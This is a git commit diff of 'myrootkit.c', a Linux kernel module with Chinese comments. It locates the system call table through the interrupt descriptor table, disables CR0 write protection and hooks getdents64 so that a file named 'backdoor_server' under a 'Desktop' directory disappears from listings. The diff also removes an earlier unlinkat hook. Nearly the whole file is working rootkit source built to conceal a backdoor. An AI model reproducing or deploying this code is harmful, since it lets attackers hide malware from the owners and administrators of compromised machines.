c8c3efd1fc5f5f9b3c82f85652f400ac99ba4d14
asensio <EmilSinclair@163.com>
2017-11-04 20:06:51 +0800

    Update myrootkit.c

--- myrootkit.c
+++ myrootkit.c
@@ -1,78 +1,151 @@
+/*
+  进程隐藏程序
+*/
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <asm/unistd.h>
 #include <linux/types.h>
 #include <linux/sched.h>
-#include <linux/dirent.h>
+#include <linux/dirent.h>//目录文件结构
 #include <linux/string.h>
 #include <linux/file.h>
 #include <linux/fs.h>
 #include <linux/list.h>
 #include <asm/uaccess.h>
 #include <linux/unistd.h>
-#include <linux/syscalls.h>
-
-
+#include <linux/slab.h> //kmalloc
 #define CALLOFF 100
-
-/*
-    http://www.freebuf.com/articles/system/108392.html
-    http://www.xzbu.com/8/view-7178072.htm
-*/
-static unsigned long **sct; //指针数组
-int (* old_unlink)(void);
 int orig_cr0;
-
-/*
-    IDT表可以驻留在线性地址空间的任何地方，处理器使用IDTR寄存器来定位IDT表的位置。
-    这个寄存器中含有IDT表32位的基地址和16位的长度（限长）值。
-    IDT表基地址应该对齐在8字节边界上以提高处理器的访问效率。
-    限长值是以字节为单位的IDT表的长度。
-*/
+char fname[20]="backdoor_server";//需要隐藏的进程名
+char *filename=fname;
+const char path[10]="Desktop";
+//module_param(processname, charp, 0);
 struct {
     unsigned short limit;
     unsigned int base;
-} __attribute__ ((packed)) idtr;
+} __attribute__ ((packed)) idtr;//__attribute__ ((packed))不需要内存对齐的优化
 
 struct {
-    unsigned short highoff;
+    unsigned short off1;
     unsigned short sel;
     unsigned char none,flags;
-    unsigned short lowoff;
+    unsigned short off2;
 } __attribute__ ((packed)) * idt;
 
+struct linux_dirent{//文件结构体
+    unsigned long     d_ino;//索引节点号
+    unsigned long     d_off;//在目录文件中的偏移
+    unsigned short    d_reclen;//文件名长
+    char    d_name[1];//文件名
+};
 
-/*
-    关闭写保护的源代码：将CR0 寄存器从 0开始数的第 16 个比特置为 0。
-*/
-void disable_write_protection(void)
+void** sys_call_table;
+
+unsigned int clear_and_return_cr0(void)//设置CR0，取消写保护位，因为在较新的内核中，sys_call_table的内存是只读的，
+//所以要修改系统调用表就必须设置CR0
 {
-        unsigned long cr0 = read_cr0();
-        clear_bit(16, &cr0);
-        write_cr0(cr0);
+    unsigned int cr0 = 0;
+    unsigned int ret;
+
+    asm volatile ("movl %%cr0, %%eax"
+            : "=a"(cr0)//eax到cr0
+         );
+    ret = cr0;//
+
+    /*clear the 16th bit of CR0,*/
+    cr0 &= 0xfffeffff;//设置CR0，第16位，WP（Write Protect）,它控制是否允许处理器向标志为只读属性的内存页写入数据,
+    //0时表示禁用写保护功能
+    asm volatile ("movl %%eax, %%cr0"
+            :
+            : "a"(cr0)//输入，cr0到eax，eax到cr0
+         );
+    return ret;
 }
-/*
-    开启写保护的源代码：将CR0 寄存器从 0开始数的第 16 个比特置为 1。
-*/
-    void enable_write_protection(void)
+
+void setback_cr0(unsigned int val)
 {
-        unsigned long cr0 = read_cr0();
-        set_bit(16, &cr0);
-        write_cr0(cr0);
+    asm volatile ("movl %%eax, %%cr0"
+            :
+            : "a"(val)//val值给eax，eax的值给CR0,恢复写保护位
+         );
 }
-/*
-    通过对反汇编分析可知，所有SCT中的系统调用都是通过call指令进行调用的。
-    因此，可以通过搜索call指令来寻找SCT的入口。
-    在x86架构下，call指令的16进制码为/xff/x14/x85，所以首先通过字符匹配搜说call指令。
-    从system_call的起始地址开始搜索，一旦搜索到连续的三个字节分别为ff,14,85,可得到call指令的地址。
-*/
-char * findoffset(char *start)
-{
+
+
+//asmlinkage long (*orig_getdents)(unsigned int fd,
+ //                   struct linux_dirent __user *dirp, unsigned int count);
+asmlinkage long (*orig_getdents64)(unsigned int fd, 
+			struct linux_dirent64 __user * dirent, unsigned int count);
+
+char * findoffset(char *start)//遍历sys_call代码，查找sys_call_table的地址
+{  //也可以通过cat /boot/System.map-`uname -r` |grep sys_call_table  查看当前sys_call_table地址
     char *p;
     for (p = start; p < start + CALLOFF; p++)
-    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')//获取call指令地址。
+    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')//寻找call指令
         return p;
     return NULL;
+}
+
+
+
+// Determine whether this file_path is the target file_path which target file placed .
+int is_hidepath(const unsigned int fd){
+	struct file * file_p = NULL; 
+	char *cur_path = NULL;
+	file_p = fget(fd);
+	cur_path=file_p->f_path.dentry->d_iname;
+	printk("%d,%s\n",fd,cur_path);
+	if(strcmp(path,cur_path)==0)
+		return 1;//find
+	return 0;
+}
+
+// Determine whether this file is the target file.
+int is_hidefile(const char * str_name){	
+	
+	printk("%s\n",str_name);
+	if(strcmp(filename,str_name)==0)
+		return 1;
+	return 0;	
+}
+
+asmlinkage long hacked_getdents64(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count){
+	
+	long value = 0;//filedir byte size
+	long left_length = 0; 
+	long len = 0;
+	if(is_hidepath(fd)==1){// Determine whether this file_path is the target file_path which target file placed .
+		struct linux_dirent64 * dirent_cp = NULL;
+		struct linux_dirent64 * dirent_orin = NULL;
+		value = orig_getdents64(fd,dirent,count);
+		dirent_cp = (struct linux_dirent64 *)kmalloc(value,GFP_KERNEL);
+		memcpy(dirent_cp,dirent,value);//static inline unsigned long copy_from_user(void *to, const void __user *from, unsigned long n)
+		left_length = value;
+		dirent_orin = dirent_cp;
+		while(left_length>0){
+			len = dirent_cp->d_reclen;	
+			left_length -=len; 	
+			if((is_hidefile((const char*)(dirent_cp->d_name)))==1) // Determine whether this file is the target file.
+			{
+				printk("find process\n");
+				memmove(dirent_cp, (char *) dirent_cp + dirent_cp->d_reclen, left_length);//delete target file
+				value -= len;
+				printk(KERN_INFO "hide successful.\n");
+				memcpy(dirent,dirent_orin,value); //hide successed
+				return value;
+			}
+			if(left_length<=0) { // have no target file
+				memcpy(dirent,dirent_orin,value);
+				return value;
+			}
+			//go ahead next
+			dirent_cp = (struct linux_dirent64 *) ((char *)dirent_cp + dirent_cp->d_reclen);
+		}
+
+	}
+	
+	
+	return orig_getdents64(fd,dirent,count);
+
 }
 
 
@@ -81,66 +154,43 @@ void **get_sct_addr(void)
     unsigned sys_call_off;
     unsigned sct = 0;
     char *p;
-    /*
-        使用内联汇编的办法调用sidt这一汇编指令加载IDTR寄存器的内容，然后储存到我们自己的这个结构体中
-    */
-    asm("sidt %0":"=m"(idtr));      
-    printk("Arciryas:idt table-0x%x\n", idtr.base);
-    /*
-        这条语句的目的是获取0×80中断所对应的IDT中的表项。
-        中断描述符表共256项，每项8字节，每项代表一种中断类型，所以最多需要256*8=2048个字节来存放IDT。
-        我们要从IDT起始地址后的8*0×80位置拷贝一个IDT表项大小的数据，也就是0×80中断所对应的IDT中的表项
-    */
-    idt = (void *) (idtr.base + 8 * 0x80);
-    /*
-        获取128号中断的中断服务程序system_call的地址。
-        此时highoffset即为ox80程序地址的高16位，lowoffset为低16位。
-        将highoffset左移16位加上lowoffset即可得到0x80中断处理程序的system_call的起始地址
-    */
-    sys_call_off = (idt->highoff << 16) | idt->lowoff;
-    /*
-        获取SCT地址
-    */
-    if ((p = findoffset((char *) sys_call_off)))
-        sct = *(unsigned *) (p + 3);    //由于SCT地址紧跟在call指令后面，所以p+3即为SCT的地址
+    asm("sidt %0":"=m"(idtr));//获取中断描述符表地址
+    idt = (void *) (idtr.base + 8 * 0x80);//通过0x80中断找到system_call的服务例程描述符项，一个中断描述符8个字节
+    sys_call_off = (idt->off2 << 16) | idt->off1;//找到对应的system_call代码地址
+    if ((p = findoffset((char *) sys_call_off)))//找到sys_call_table的地址
+        sct = *(unsigned *) (p + 3);
     return ((void **)sct);
 }
 
-int my_unlink(void)
-{
-        printk(KERN_INFO "unlink unavailable\n");
-        return 0;
-}
 
-
-static int enter (void)
+static int filter_init(void)
 {
-    sct = get_sct_addr();
-    if (!sct)
+    sys_call_table = get_sct_addr();
+    if (!sys_call_table)
     {
         printk("get_act_addr(): NULL...\n");
         return 0;
     }
-    else{
-        printk("sct: 0x%x\n", (unsigned int)sct);
-        return 0;
-    }
-    disable_write_protection();
-    old_unlink=(void *)sct[__NR_unlinkat];
-    sct[__NR_unlinkat]=(unsigned long *)&my_unlink;
-    enable_write_protection();
-    return 0;
+    else
+        printk("sct: 0x%x\n", (unsigned int)sys_call_table);
+    orig_getdents64 = sys_call_table[__NR_getdents64];//保存原来的系统调用
+
+    orig_cr0 = clear_and_return_cr0();//取消写保护位，并且返回原来的cr0
+    sys_call_table[__NR_getdents64] = hacked_getdents64;//替换成我们自己写的系统调用
+    setback_cr0(orig_cr0);
+    printk(KERN_INFO "hideps: module loaded.\n");
+                return 0;
 }
-static void go_out(void)
+
+
+static void filter_exit(void)
 {
-        printk(KERN_INFO "Bye, restoring syscalls\n");
-        disable_write_protection();
-        sct[__NR_unlinkat]=(unsigned long *)old_unlink;
-        enable_write_protection();
+    orig_cr0 = clear_and_return_cr0();
+    if (sys_call_table)
+    sys_call_table[__NR_getdents64] = orig_getdents64;//恢复默认的系统调用
+    setback_cr0(orig_cr0);
+    printk(KERN_INFO "hideps: module removed\n");
 }
-
-
-
+module_init(filter_init);
+module_exit(filter_exit);
 MODULE_LICENSE("GPL");
-module_init(enter);
-module_exit(go_out);
